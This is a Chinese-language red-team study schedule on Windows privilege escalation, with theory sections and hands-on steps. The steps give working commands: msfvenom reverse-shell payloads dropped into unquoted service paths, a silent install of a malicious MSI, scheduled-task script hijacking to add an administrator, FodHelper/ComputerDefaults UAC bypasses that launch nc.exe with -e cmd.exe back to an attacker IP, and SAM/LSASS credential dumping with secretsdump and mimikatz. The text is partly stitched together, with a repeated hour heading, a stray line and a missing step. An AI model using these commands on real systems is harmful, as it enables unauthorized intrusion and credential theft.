周二：服务权限与计划任务提权
================================================================================

📚 第1小时 | 理论学习 (09:00 - 10:00)
  学习内容：Windows服务权限与计划任务提权原理
    - Windows服务架构：服务控制管理器(SCM)、服务二进制文件、服务账户
    - 服务权限类型：SERVICE_ALL_ACCESS, SERVICE_CHANGE_CONFIG, SERVICE_START, SERVICE_STOP
    - Unquoted Service Path提权原理
      - 路径如C:\Program Files\Unquoted Path\service.exe
      - 系统会依次尝试执行C:\Program.exe, C:\Program Files\Unquoted.exe
    - 可写服务二进制文件替换原理
      - 当前用户对服务的二进制文件路径有写权限
      - 替换为恶意exe并重启服务
    - 服务注册表修改：HKLM\SYSTEM\CurrentControlSet\Services\
    - 计划任务(Scheduled Tasks)提权
      - schtasks命令检查可写脚本/程序引用的任务
      - 任务触发条件与权限上下文
    - AlwaysInstallElevated注册表策略
      - HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated = 1
      - HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated = 1
  参考文件：/home/a/成长为一个红队/archstrike-privilege-escalation教学/02-Windows权限提升技术.txt

💻 第2小时 | 动手实践 (10:00 - 11:00)
  练习内容：服务权限利用和计划任务提权
  参考文件：/home/a/成长为一个红队/archstrike-privilege-escalation教学/02-Windows权限提升技术.txt

  操作步骤：
    Step 1: 枚举Unquoted Service Path
      wmic service get name,displayname,pathname,startmode | findstr /i "Auto"
      wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows"
      或使用: Get-WmiObject win32_service | ?{$_.StartMode -eq "Auto"} | select Name,PathName
    Step 2: 检查服务的ACL权限
      accesschk64.exe -uwcqv "当前用户" *
      accesschk64.exe -ucqv <服务名>
      确认有SERVICE_CHANGE_CONFIG权限
    Step 3: 利用Unquoted Service Path提权
      选择一个有写权限的目录（如C:\Program Files\）
      生成恶意exe: msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f exe -o Program.exe
      上传到C:\Program Files\Program.exe
      重启服务: net stop <服务名> && net start <服务名>
    Step 4: 检查AlwaysInstallElevated
      注册表查询:
        reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
        reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
      若均为1:
        msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=4445 -f msi -o malicious.msi
        msiexec /quiet /qn /i malicious.msi
    Step 5: 检查计划任务
      schtasks /query /fo LIST /v | findstr /i "Task To Run:"
      寻找可写脚本路径或可篡改的程序引用
      icacls <任务程序路径> 检查写权限
    Step 6: 计划任务劫持利用
      若发现可写脚本: echo "net localgroup Administrators 用户 /add" >> script.bat
      若任务触发频率快，等待任务执行后验证权限

    - PipePotato/EfsPotato 等其他变种
    - CLSID选择策略：针对不同OS版本选取合适的CLSID

📚 第1小时 | 理论学习 (09:00 - 10:00)
  学习内容：UAC绕过和凭证提取原理
    - UAC(User Account Control)体系结构
      - 完整性级别(Integrity Level): Low/Medium/High/System
      - UAC提权提示(Prompt)触发条件
      - Admin Approval Mode (AAM)
    - 常见UAC绕过技术：
      - DLL劫持绕过（利用信任的AutoElevate程序）
      - 注册表键劫持（HKCR\mscfile\shell绕过）
      - FodHelper.exe绕过（适用于Win10）
      - ComputerDefaults.exe绕过
      - Eventvwr.exe注册表劫持
    - 凭证提取技术：
      - SAM文件结构：LM Hash/NTLM Hash
      - reg save HKLM\SAM / reg save HKLM\SYSTEM 离线提取
      - LSA Secrets提取: reg save HKLM\SECURITY
      - LSASS进程内存DUMP: procdump, Task Manager, comsvcs.dll
      - mimikatz凭证提取：sekurlsa::logonpasswords, lsadump::sam
      - DPAPI解密与浏览器/应用程序凭证
      - Kerberos Tickets提取 (TGT/TGS)
  参考文件：/home/a/成长为一个红队/archstrike-privilege-escalation教学/02-Windows权限提升技术.txt

💻 第2小时 | 动手实践 (10:00 - 11:00)
  练习内容：UAC绕过和凭证提取实战
  参考文件：/home/a/成长为一个红队/archstrike-privilege-escalation教学/02-Windows权限提升技术.txt

  操作步骤：
    Step 1: 确认当前完整性级别
      whoami /groups | findstr /i "Mandatory"
      如果显示Medium Mandatory Level，尝试UAC绕过提升到High
    Step 2: 尝试FodHelper.exe UAC绕过
      方法: 注册表劫持+创建特殊目录
      reg add "HKCU\Software\Classes\ms-settings\Shell\open\command" /d "cmd.exe" /f
      reg add "HKCU\Software\Classes\ms-settings\Shell\open\command" /v DelegateExecute /t REG_SZ /d "" /f
      fodhelper.exe
    Step 3: 尝试ComputerDefaults.exe UAC绕过
      reg add "HKCU\Software\Classes\ms-settings\Shell\open\command" /d "C:\Windows\Tasks\nc.exe IP 6666 -e cmd.exe" /f
      reg add "HKCU\Software\Classes\ms-settings\Shell\open\command" /v DelegateExecute /t REG_SZ /d "" /f
      ComputerDefaults.exe
      攻击机监听: nc -lvnp 6666
    Step 4: SAM+SYSTEM离线凭证提取
      reg save HKLM\SAM C:\Windows\Tasks\sam.save
      reg save HKLM\SYSTEM C:\Windows\Tasks\system.save
      下载到攻击机: impacket-secretsdump -sam sam.save -system system.save LOCAL
      获取所有用户的NTLM Hash

      用mimikatz加载: sekurlsa::minidump lsass.dmp; sekurlsa::logonpasswords
    Step 6: mimikatz在线凭证提取
      上传mimikatz.exe
      执行: privilege::debug
            token::elevate
            sekurlsa::logonpasswords
            lsadump::sam
      记录所有提取到的用户和哈希
